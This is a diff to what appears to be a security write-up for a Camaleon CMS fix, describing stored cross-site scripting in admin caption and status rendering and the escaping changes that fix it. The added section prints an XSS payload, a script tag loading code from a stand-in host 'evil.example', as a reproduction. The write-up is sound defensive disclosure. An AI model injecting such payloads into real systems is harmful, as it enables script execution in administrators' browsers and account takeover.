@@ -58,6 +58,16 @@ An injected status is by definition not canonical, so it always takes the `else`
 
 **B.** `CustomFieldGroup#get_caption` ([custom_field_group.rb:125](../../../app/models/camaleon_cms/custom_field_group.rb)) builds captions in the **model**, rendered by `raw(f.get_caption)` at `admin/settings/custom_fields/index.html.erb:35`. Its `the_title` interpolations are escaped by #1206, but three model attributes are not: `Widget::Main#name`, `Theme#name`, and `NavMenu#name`. None is in `normalize_attrs` — only `:description` is, on those models.
 
+A fourth interpolation on the same path was found while writing the reproduction spec: the `else` arm emits `object_class` itself. The placement check added by [#1217](https://github.com/owen2345/camaleon-cms/pull/1217) admits any class name paired with the current site's id — that arm exists so hook-registered models need no allow-list — so `object_class` is attacker-settable text like the names are, and it reproduces identically:
+
+```
+object_class stored: "<script src=//evil.example/a.js></script>"
+get_caption output:  "Fields for <b><script src=//evil.example/a.js></script></b>"
+injected <script> nodes: 1
+```
+
+It is fixed here rather than deferred: the change makes `get_caption` return a `SafeBuffer`, and leaving one interpolation unescaped in a method now declared safe is how the next regression happens.
+
 ### Privilege and impact
 
 | | Attacker needs | Victim | Trigger |
@@ -70,7 +80,7 @@ Neither requires a superuser. The admin panel is same-origin with the frontend, 
 ## What changes
 
 - `PostDecorator#the_status` escapes the interpolated status before returning, and returns an `ActiveSupport::SafeBuffer`.
-- `CustomFieldGroup#get_caption` escapes the three unescaped model names, and returns a `SafeBuffer`.
+- `CustomFieldGroup#get_caption` escapes the three unescaped model names and the `object_class` fallback, and returns a `SafeBuffer`.
 - `TermTaxonomyDecorator#the_status` gets the same treatment for consistency. It emits only I18n strings today and is **not** exploitable; it is in scope because it is the same pattern in the same rendering path and leaving it invites the next regression.
 - Reproducing request specs for A and B, plus a spec pinning that the `options[:status_default]` → `restore` path cannot poison the column into a rendered sink.
 
